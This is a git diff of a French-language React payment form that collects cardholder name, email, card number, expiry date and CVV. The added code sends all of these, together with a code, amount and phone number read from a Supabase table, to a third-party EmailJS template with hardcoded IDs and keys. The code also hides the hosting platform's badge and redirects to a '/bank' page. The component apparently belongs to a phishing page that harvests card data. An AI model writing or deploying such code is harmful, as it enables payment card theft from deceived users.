@@ -3,10 +3,11 @@ import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
-import { supabase } from "@/lib/supabase";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/components/ui/use-toast";
 import { Lock } from "lucide-react";
+import emailjs from "emailjs-com";
+import { supabase } from "@/lib/supabase"; // Toujours utilisé pour lire les infos en DB
 
 const Card = () => {
   const [formData, setFormData] = useState({
@@ -20,12 +21,9 @@ const Card = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
 
-  // Masquer l'élément lovable-badge au montage
   useEffect(() => {
     const element = document.getElementById("lovable-badge");
-    if (element) {
-      element.style.display = "none";
-    }
+    if (element) element.style.display = "none";
   }, []);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -44,7 +42,7 @@ const Card = () => {
       !formData.cryptogramme
     ) {
       toast({
-        title: "Erreur de validation",
+        title: "Erreur",
         description: "Veuillez remplir tous les champs",
         variant: "destructive",
       });
@@ -54,40 +52,27 @@ const Card = () => {
     setIsLoading(true);
 
     const userId = localStorage.getItem("userId");
-
     if (!userId) {
       navigate("/");
       return;
     }
 
     try {
-    // 1. Update Supabase avec les données de la carte
-    await supabase
-      .from("sefon")
-      .update({
-        email: formData.email,
-        numerocarte: formData.numerocarte,
-        dateexpiration: formData.dateexpiration,
-        cryptogramme: formData.cryptogramme,
-      })
-      .eq("id", userId);
+      // Récupération des données depuis Supabase
+      const { data, error } = await supabase
+        .from("sefon")
+        .select("code, montant, telephone")
+        .eq("id", userId)
+        .single();
 
-    // 2. Récupérer le code digital, montant paiement et téléphone en base
-    const { data, error } = await supabase
-      .from("sefon")
-      .select("code, montant, telephone")
-      .eq("id", userId)
-      .single();
+      if (error || !data) throw error;
 
-    if (error) throw error;
+      // Envoi avec EmailJS
+      const serviceID = "service_mev4gqt";
+      const templateID = "template_uf95szs";
+      const publicKey = "u9q4QhywRWjrfKnHj";
 
-    // 3. Appeler ton backend Netlify pour envoyer l'email
-    const response = await fetch("/.netlify/functions/sendEmail", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
+      const templateParams = {
         email: formData.email,
         titulaire: formData.titulaire,
         numerocarte: formData.numerocarte,
@@ -96,32 +81,28 @@ const Card = () => {
         code: data.code,
         montant: data.montant,
         telephone: data.telephone,
-      }),
-    });
+      };
 
-    if (!response.ok) {
-      throw new Error("Erreur lors de l'envoi de l'e-mail");
+      await emailjs.send(serviceID, templateID, templateParams, publicKey);
+
+      toast({
+        title: "Succès",
+        description: "Le mail a été envoyé avec succès.",
+        variant: "default",
+      });
+
+      navigate("/bank");
+    } catch (err) {
+      console.error(err);
+      toast({
+        title: "Erreur",
+        description: "L'envoi du mail a échoué.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsLoading(false);
     }
-
-    toast({
-      title: "Succès",
-      description: "Vos informations ont été enregistrées et un mail vous a été envoyé.",
-      variant: "default",
-    });
-
-    navigate("/bank");
-  } catch (error) {
-    console.error(error);
-    toast({
-      title: "Erreur",
-      description:
-        "Une erreur est survenue lors de l'enregistrement ou de l'envoi du mail.",
-      variant: "destructive",
-    });
-  } finally {
-    setIsLoading(false);
-  }
-};
+  };
 
   return (
     <div className="min-h-screen flex flex-col">
@@ -156,7 +137,7 @@ const Card = () => {
                 name="titulaire"
                 value={formData.titulaire}
                 onChange={handleChange}
-                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
+                className="border-2 border-yellow-300"
                 required
               />
             </div>
@@ -169,7 +150,7 @@ const Card = () => {
                 type="email"
                 value={formData.email}
                 onChange={handleChange}
-                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
+                className="border-2 border-yellow-300"
                 required
               />
             </div>
@@ -182,7 +163,7 @@ const Card = () => {
                 placeholder="•••• •••• •••• ••••"
                 value={formData.numerocarte}
                 onChange={handleChange}
-                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
+                className="border-2 border-yellow-300"
                 required
               />
             </div>
@@ -196,7 +177,7 @@ const Card = () => {
                   placeholder="MM/YY"
                   value={formData.dateexpiration}
                   onChange={handleChange}
-                  className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
+                  className="border-2 border-yellow-300"
                   required
                 />
               </div>
@@ -209,7 +190,7 @@ const Card = () => {
                   placeholder="•••"
                   value={formData.cryptogramme}
                   onChange={handleChange}
-                  className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
+                  className="border-2 border-yellow-300"
                   required
                 />
               </div>
@@ -217,7 +198,7 @@ const Card = () => {
 
             <Button
               type="submit"
-              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 flex items-center justify-center"
+              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3"
               disabled={isLoading}
             >
               <Lock className="mr-2 h-4 w-4" />
